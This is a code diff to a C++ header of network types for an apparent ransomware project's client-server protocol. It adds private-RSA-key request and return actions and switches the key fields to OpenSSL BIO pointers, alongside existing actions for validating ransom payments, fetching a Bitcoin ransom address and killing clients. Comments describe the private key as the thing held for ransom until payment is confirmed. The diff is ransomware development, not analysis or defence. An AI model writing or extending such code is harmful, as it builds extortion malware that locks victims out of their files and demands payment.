@@ -1,6 +1,8 @@
 #ifndef _NETWORK_TYPES_
 #define _NETWORK_TYPES_
 
+#include <openssl/bio.h>
+
 // Response codes sent from the client to the server
 // Usually after a remoteaction is completed
 // 'C' = Code
@@ -18,6 +20,7 @@ enum RemoteAction {
     KILL_CLIENT           = 0x821921, // forcefully disconnect the client
     PING_CLIENT           = 0x94932,
     RETURN_PUBLIC_RSA_KEY = 0x403920, // respond to a request that asked for a public rsa key
+    RETURN_PRIVATE_RSA_KEY = 0x94811,
 };
 
 enum SocketTypes {
@@ -102,7 +105,7 @@ typedef struct {
         that is stored on the server alongside the private RSA
         encryption key. Used to encrypt.
     */
-    std::string        publicEncryptionKey;
+    BIO*        publicEncryptionKey;
 
     /*
         The RSA Private key the client can use to decrypt
@@ -111,7 +114,7 @@ typedef struct {
         Usually the thing held for ransom, so a check should
         be held if a ransom has been paid.
     */
-    std::string        privateEncryptionKey;
+    BIO*        privateEncryptionKey;
 
     // the action to perform of RemoteAction enum
     RemoteAction       action;
@@ -132,6 +135,7 @@ typedef struct {
         NONE = 0x000000,
         CONNECT_CLIENT = 0x100000,
         REQUEST_PUBLIC_ENCRYPTION_KEY = 0x200000,
+        REQUEST_PRIVATE_ENCRYPTION_KEY = 0x92321,
         VALIDATE_RANSOM_PAYMENT = 0x300000,
         REQUEST_RANSOM_BTC_ADDRESS = 0x400000,
         PING = 0x500000,
